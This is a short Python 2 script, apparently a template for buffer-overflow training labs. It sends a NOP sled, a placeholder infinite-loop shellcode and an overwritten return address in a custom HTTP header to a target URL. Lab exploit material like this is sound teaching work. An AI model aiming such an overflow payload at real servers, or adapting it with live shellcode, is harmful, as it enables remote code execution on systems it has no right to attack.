#!/usr/bin/env python
import click
import requests
import struct


### Edit these values for the labs!!!
BUFFERSIZE = 259
SHELLCODE  = '\xeb\xfe'
PADDING    = '\x90'*(BUFFERSIZE - len(SHELLCODE))
SAVED_EIP  = 0xbfffd30c


@click.command()
@click.argument('url')
def main(url):
    payload = PADDING + SHELLCODE + struct.pack('I', SAVED_EIP)
    try:
        r = requests.get(url, headers={'X-Ploit': payload, 'User-Agent':'ACTRv1.0'})
    except Exception as e:
        print 'An error occurred while sending the request -> {}'.format(e)
    else:
        print '{} {}'.format(r.status_code, r.reason)
    return

if __name__ == '__main__':
    main()
